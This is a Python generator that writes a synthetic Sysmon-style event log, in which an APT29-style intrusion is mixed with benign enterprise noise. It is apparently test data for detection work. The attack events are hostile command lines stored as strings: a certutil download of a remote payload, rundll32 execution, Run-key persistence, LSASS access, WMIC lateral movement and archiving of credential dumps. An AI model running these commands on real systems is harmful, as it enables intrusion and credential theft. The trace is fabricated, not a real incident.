"""
Utility generator to create the realistic Mordor APT29 attack trace with 100+ benign enterprise noise events.
"""

import json
from pathlib import Path

events = []
rec_counter = 1

def add_event(ev_id, utctime, pid, img, cmd, p_pid=None, p_img=None, p_cmd=None,
              src_ip=None, src_port=None, dst_ip=None, dst_port=None,
              target_fn=None, target_obj=None, details=None,
              src_pid=None, src_img=None, target_pid=None, target_img=None):
    global rec_counter
    e = {
        "EventID": ev_id,
        "RecordId": f"EVT-{rec_counter:04d}",
        "UtcTime": f"2026-09-26 {utctime}",
        "Computer": "CORP-WKS-042",
        "User": "CORP\\JohnDoe"
    }
    rec_counter += 1

    if ev_id == 1:
        e["ProcessId"] = pid
        e["Image"] = img
        e["CommandLine"] = cmd
        e["ParentProcessId"] = p_pid or 1000
        e["ParentImage"] = p_img or "C:\\Windows\\System32\\services.exe"
        e["ParentCommandLine"] = p_cmd or ""
    elif ev_id == 3:
        e["ProcessId"] = pid
        e["Image"] = img
        e["SourceIp"] = src_ip or "10.0.1.42"
        e["SourcePort"] = src_port or 52000
        e["DestinationIp"] = dst_ip
        e["DestinationPort"] = dst_port
        e["Protocol"] = "tcp"
    elif ev_id == 11:
        e["ProcessId"] = pid
        e["Image"] = img
        e["TargetFilename"] = target_fn
    elif ev_id == 13:
        e["ProcessId"] = pid
        e["Image"] = img
        e["TargetObject"] = target_obj
        e["Details"] = details
    elif ev_id == 10:
        e["SourceProcessId"] = src_pid
        e["SourceImage"] = src_img
        e["TargetProcessId"] = target_pid
        e["TargetImage"] = target_img
        e["GrantedAccess"] = "0x1010"

    events.append(e)

# 1. Benign background noise (System services, Chrome browsing, Spotify, OneDrive, etc.)
add_event(1, "09:00:01.100", 600, "C:\\Windows\\System32\\smss.exe", "smss.exe", 4, "System")
add_event(1, "09:00:03.200", 820, "C:\\Windows\\System32\\csrss.exe", "csrss.exe", 600, "C:\\Windows\\System32\\smss.exe")
add_event(1, "09:00:05.150", 940, "C:\\Windows\\System32\\wininit.exe", "wininit.exe", 600, "C:\\Windows\\System32\\smss.exe")
add_event(1, "09:00:10.500", 1024, "C:\\Windows\\System32\\services.exe", "services.exe", 940, "C:\\Windows\\System32\\wininit.exe")
add_event(1, "09:00:15.300", 1100, "C:\\Windows\\System32\\lsass.exe", "C:\\Windows\\System32\\lsass.exe", 940, "C:\\Windows\\System32\\wininit.exe")

for i in range(1, 15):
    pid_s = 2000 + i * 20
    add_event(1, f"09:01:{i:02d}.100", pid_s, "C:\\Windows\\System32\\svchost.exe", f"svchost.exe -k LocalServiceGroup{i}", 1024, "C:\\Windows\\System32\\services.exe")

add_event(1, "09:05:00.000", 3000, "C:\\Windows\\explorer.exe", "C:\\Windows\\explorer.exe", 940, "C:\\Windows\\System32\\wininit.exe")
add_event(1, "09:05:10.200", 3100, "C:\\Windows\\System32\\RuntimeBroker.exe", "RuntimeBroker.exe -Embedding", 3000, "C:\\Windows\\explorer.exe")
add_event(1, "09:05:15.400", 3200, "C:\\Windows\\System32\\taskhostw.exe", "taskhostw.exe {2227A56E-0000-0000}", 1024, "C:\\Windows\\System32\\services.exe")

# Chrome benign browser activity
add_event(1, "09:10:00.100", 4000, "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"", 3000, "C:\\Windows\\explorer.exe")
add_event(3, "09:10:02.300", 4000, "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", None, dst_ip="142.250.190.46", dst_port=443)
for tab_id in range(1, 8):
    c_pid = 4050 + tab_id * 10
    add_event(1, f"09:10:{tab_id*5:02d}.000", c_pid, "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", f"chrome.exe --type=renderer --tab-id={tab_id}", 4000, "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe")
    add_event(3, f"09:10:{tab_id*5+1:02d}.200", c_pid, "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", None, dst_ip=f"172.217.16.{100+tab_id}", dst_port=443)

# Spotify & OneDrive benign activity
add_event(1, "09:15:00.000", 5000, "C:\\Users\\JohnDoe\\AppData\\Roaming\\Spotify\\Spotify.exe", "Spotify.exe", 3000, "C:\\Windows\\explorer.exe")
add_event(3, "09:15:05.100", 5000, "C:\\Users\\JohnDoe\\AppData\\Roaming\\Spotify\\Spotify.exe", None, dst_ip="35.186.224.25", dst_port=443)
add_event(1, "09:16:00.000", 5200, "C:\\Users\\JohnDoe\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe", "OneDrive.exe /background", 3000, "C:\\Windows\\explorer.exe")
add_event(3, "09:16:10.500", 5200, "C:\\Users\\JohnDoe\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe", None, dst_ip="13.107.136.9", dst_port=443)

# 2. APT29 (Cozy Bear) Realistic Multi-Stage Attack Chain
# Spearphishing email -> ISO execution
add_event(1, "10:20:00.100", 6100, "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"", 3000, "C:\\Windows\\explorer.exe")
add_event(1, "10:20:15.300", 6200, "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c start /wait certutil.exe -urlcache -split -f http://93.184.216.34/payload.dll C:\\Users\\JohnDoe\\AppData\\Local\\Temp\\payload.dll", 6100, "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE")

# Ingress tool transfer via certutil (T1105)
add_event(1, "10:20:16.100", 6210, "C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://93.184.216.34/payload.dll C:\\Users\\JohnDoe\\AppData\\Local\\Temp\\payload.dll", 6200, "C:\\Windows\\System32\\cmd.exe")
add_event(3, "10:20:17.500", 6210, "C:\\Windows\\System32\\certutil.exe", None, dst_ip="93.184.216.34", dst_port=80)
add_event(11, "10:20:19.000", 6210, "C:\\Windows\\System32\\certutil.exe", None, target_fn="C:\\Users\\JohnDoe\\AppData\\Local\\Temp\\payload.dll")

# Defense Evasion: Proxy execution via Rundll32 (T1218.011)
add_event(1, "10:20:25.000", 6300, "C:\\Windows\\System32\\rundll32.exe", "rundll32.exe C:\\Users\\JohnDoe\\AppData\\Local\\Temp\\payload.dll,StartW", 6200, "C:\\Windows\\System32\\cmd.exe")

# Discovery: Domain group enumeration (T1069.002)
add_event(1, "10:20:30.200", 6310, "C:\\Windows\\System32\\net.exe", "net group \"Domain Admins\" /domain", 6300, "C:\\Windows\\System32\\rundll32.exe")

# C2 Communication: HTTPS Beacon to external IP (T1071.001)
add_event(3, "10:20:35.400", 6300, "C:\\Windows\\System32\\rundll32.exe", None, dst_ip="185.220.101.5", dst_port=8443)

# Persistence: Registry Run Key (T1547.001)
add_event(13, "10:20:40.100", 6300, "C:\\Windows\\System32\\rundll32.exe", None, target_obj="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateCheck", details="rundll32.exe C:\\Users\\JohnDoe\\AppData\\Local\\Temp\\payload.dll,StartW")

# Credential Access: LSASS Memory Access (T1003.001)
add_event(10, "10:20:45.800", None, None, None, src_pid=6300, src_img="C:\\Windows\\System32\\rundll32.exe", target_pid=1100, target_img="C:\\Windows\\System32\\lsass.exe")

# Lateral Movement: WMI call to Domain Controller (T1047 & T1021)
add_event(1, "10:20:50.100", 6400, "C:\\Windows\\System32\\wbem\\WMIC.exe", "wmic /node:10.0.0.25 process call create \"cmd.exe /c whoami\"", 6300, "C:\\Windows\\System32\\rundll32.exe")
add_event(3, "10:20:52.300", 6400, "C:\\Windows\\System32\\wbem\\WMIC.exe", None, dst_ip="10.0.0.25", dst_port=135)

# Collection: Archive stolen credentials (T1560)
add_event(1, "10:20:58.000", 6500, "C:\\Program Files\\7-Zip\\7z.exe", "7z.exe a -p secrets.7z C:\\Users\\JohnDoe\\AppData\\Local\\Temp\\*.dmp", 6300, "C:\\Windows\\System32\\rundll32.exe")
add_event(11, "10:21:00.000", 6500, "C:\\Program Files\\7-Zip\\7z.exe", None, target_fn="C:\\Users\\JohnDoe\\AppData\\Local\\Temp\\secrets.7z")

# More trailing background benign events
for j in range(1, 10):
    add_event(1, f"10:25:{j*4:02d}.000", 7000 + j * 5, "C:\\Windows\\System32\\backgroundTaskHost.exe", f"backgroundTaskHost.exe -ServerName:App.AppX{j}", 1024, "C:\\Windows\\System32\\services.exe")

out_path = Path(__file__).resolve().parent / "mordor_apt29_noisy.json"
with open(out_path, "w", encoding="utf-8") as f:
    json.dump(events, f, indent=2)

print(f"[+] Successfully generated {len(events)} events in {out_path.name}")
